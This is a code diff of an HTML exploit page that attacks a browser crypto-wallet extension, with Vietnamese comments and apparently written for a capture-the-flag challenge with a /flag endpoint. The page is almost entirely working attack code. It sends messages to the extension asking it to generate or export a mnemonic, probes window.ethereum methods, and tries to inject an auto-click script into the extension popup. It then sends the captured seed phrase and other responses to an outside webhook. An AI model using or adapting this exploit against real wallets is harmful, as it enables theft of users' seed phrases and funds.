@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DiceWallet Exploit - Trigger Wallet Generation</title>
+    <title>DiceWallet Exploit - Firefox Version</title>
 </head>
 <body>
-    <h1>DiceWallet Exploit</h1>
+    <h1>DiceWallet Exploit (Firefox)</h1>
     <div id="status"></div>
     
     <script>
@@ -17,95 +17,144 @@
         }
         
         function sendToWebhook(data) {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(() => {
-                new Image().src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(data))}`;
-            });
+            // Dùng navigator.sendBeacon cho reliability
+            const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+            navigator.sendBeacon(WEBHOOK_URL, blob);
+            
+            // Fallback dùng image
+            new Image().src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(data))}`;
         }
         
         async function triggerWalletGeneration() {
-            log('1. Attempting to trigger wallet generation...');
+            log('1. Checking for extension...');
+            
+            // Kiểm tra xem extension có tồn tại không
+            if (typeof browser === 'undefined' || !browser.runtime) {
+                log('❌ browser.runtime not available');
+                log('Trying chrome.runtime fallback...');
+            }
+            
+            // Thử cả browser và chrome
+            const runtime = browser?.runtime || chrome?.runtime;
+            
+            if (!runtime) {
+                log('❌ No runtime found');
+                return;
+            }
+            
+            log('✅ Runtime found');
             
             // CÁCH 1: Gửi message trực tiếp đến background
             try {
-                log('Sending DICE_POPUP generate message...');
-                const response = await chrome.runtime.sendMessage(EXTENSION_ID, {
-                    type: 'DICE_POPUP',
-                    action: 'generate'
-                });
+                log('2. Sending generate message...');
                 
-                log('✅ Generate response:', response);
+                const response = await runtime.sendMessage(
+                    EXTENSION_ID,
+                    {
+                        type: 'DICE_POPUP',
+                        action: 'generate'
+                    }
+                );
+                
+                log('✅ Response:', response);
                 sendToWebhook({
                     type: 'generate_response',
-                    response
+                    response: response
                 });
                 
                 // Nếu có mnemonic
-                if (response && response.mnemonic) {
+                if (response?.mnemonic) {
                     log('🎯 Got mnemonic:', response.mnemonic);
-                    
-                    // Gửi flag
-                    const flagRes = await fetch('/flag', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ mnemonic: response.mnemonic })
+                    sendToWebhook({
+                        type: 'mnemonic_captured',
+                        mnemonic: response.mnemonic
                     });
                     
-                    const flagData = await flagRes.json();
-                    if (flagData.flag) {
-                        log(`🏁 FLAG: ${flagData.flag}`);
+                    // Thử gửi flag
+                    try {
+                        const flagRes = await fetch('/flag', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ mnemonic: response.mnemonic })
+                        });
+                        const flagData = await flagRes.json();
+                        if (flagData.flag) {
+                            log(`🏁 FLAG: ${flagData.flag}`);
+                            sendToWebhook({ type: 'flag', flag: flagData.flag });
+                        }
+                    } catch (e) {
+                        log('Flag submit error:', e.message);
                     }
                 }
                 
             } catch (e) {
                 log('❌ Generate failed:', e.message);
-            }
-            
-            // CÁCH 2: Thử action addAccount
-            try {
-                log('Sending DICE_POPUP addAccount message...');
-                const response = await chrome.runtime.sendMessage(EXTENSION_ID, {
-                    type: 'DICE_POPUP',
-                    action: 'addAccount'
-                });
-                
-                log('✅ addAccount response:', response);
                 sendToWebhook({
-                    type: 'addAccount_response',
-                    response
+                    type: 'generate_error',
+                    error: e.message
                 });
-                
-            } catch (e) {
-                log('❌ addAccount failed:', e.message);
             }
             
-            // CÁCH 3: Thử qua window.ethereum
-            if (window.ethereum) {
+            // CÁCH 2: Thử các action khác
+            const actions = ['addAccount', 'getState', 'exportMnemonic'];
+            
+            for (const action of actions) {
                 try {
-                    log('Calling wallet_generate via ethereum...');
-                    const result = await window.ethereum.request({
-                        method: 'wallet_generate'
+                    log(`Trying action: ${action}...`);
+                    const response = await runtime.sendMessage(EXTENSION_ID, {
+                        type: 'DICE_POPUP',
+                        action: action
                     });
                     
-                    log('✅ wallet_generate:', result);
+                    log(`✅ ${action}:`, response);
                     sendToWebhook({
-                        type: 'wallet_generate',
-                        result
+                        type: 'action_response',
+                        action: action,
+                        response: response
                     });
                     
                 } catch (e) {
-                    log('❌ wallet_generate failed:', e.message);
+                    log(`❌ ${action}:`, e.message);
+                }
+                
+                // Delay giữa các request
+                await new Promise(r => setTimeout(r, 1000));
+            }
+            
+            // CÁCH 3: Thử gọi qua window.ethereum
+            if (window.ethereum) {
+                log('3. Testing ethereum methods...');
+                
+                const methods = [
+                    'eth_accounts',
+                    'wallet_getState',
+                    'wallet_generate',
+                    'wallet_exportMnemonic'
+                ];
+                
+                for (const method of methods) {
+                    try {
+                        log(`Calling ${method}...`);
+                        const result = await window.ethereum.request({ method });
+                        log(`✅ ${method}:`, result);
+                        sendToWebhook({
+                            type: 'ethereum_method',
+                            method: method,
+                            result: result
+                        });
+                    } catch (e) {
+                        log(`❌ ${method}:`, e.message);
+                    }
                 }
             }
             
-            // CÁCH 4: Mở popup và tự động click
-            log('2. Opening popup to trigger manually...');
+            // CÁCH 4: Mở popup và inject script
+            log('4. Opening popup...');
             
-            const popupUrl = `moz-extension://${EXTENSION_ID}/popup.html#/onboard`;
+            const popupUrl = `moz-extension://${EXTENSION_ID}/popup.html`;
+            log('Popup URL:', popupUrl);
+            
+            // Thử mở popup
             const popup = window.open(popupUrl, '_blank', 'width=400,height=600');
             
             if (!popup) {
@@ -118,34 +167,54 @@
                 iframe.style.top = '10px';
                 iframe.style.right = '10px';
                 iframe.style.zIndex = '9999';
+                iframe.style.border = '4px solid red';
                 document.body.appendChild(iframe);
+                
+                // Thử inject script vào iframe
+                setTimeout(() => {
+                    try {
+                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        if (iframeDoc) {
+                            log('Injecting script into iframe...');
+                            
+                            const script = iframeDoc.createElement('script');
+                            script.textContent = `
+                                // Auto-click generate button
+                                setTimeout(() => {
+                                    const btn = document.getElementById('btn-generate');
+                                    if (btn) {
+                                        btn.click();
+                                        console.log('Clicked generate!');
+                                        
+                                        // Lấy mnemonic từ response
+                                        window.addEventListener('message', (e) => {
+                                            if (e.data?.type === 'DICE_RESPONSE') {
+                                                fetch('${WEBHOOK_URL}', {
+                                                    method: 'POST',
+                                                    body: JSON.stringify(e.data)
+                                                });
+                                            }
+                                        });
+                                    }
+                                }, 2000);
+                            `;
+                            iframeDoc.body.appendChild(script);
+                        }
+                    } catch (e) {
+                        log('Cannot inject into iframe:', e.message);
+                    }
+                }, 3000);
             }
             
-            // CÁCH 5: Inject script vào popup nếu có thể
-            setTimeout(() => {
-                log('3. Attempting to auto-click in popup...');
-                
-                // Gửi message đến tất cả các tab
-                chrome.runtime.sendMessage(EXTENSION_ID, {
-                    type: 'DICE_POPUP',
-                    action: 'inject',
-                    code: `
-                        // Tự động click nút Create New Wallet
-                        setTimeout(() => {
-                            const btn = document.getElementById('btn-generate');
-                            if (btn) {
-                                btn.click();
-                                console.log('Clicked generate button!');
-                            }
-                        }, 2000);
-                    `
-                });
-            }, 3000);
+            log('=== Exploit Complete - Check Webhook ===');
         }
         
-        // Start
-        log('0. Starting exploit...');
-        triggerWalletGeneration();
+        // Start khi DOM ready
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', triggerWalletGeneration);
+        } else {
+            triggerWalletGeneration();
+        }
     </script>
 </body>
 </html>
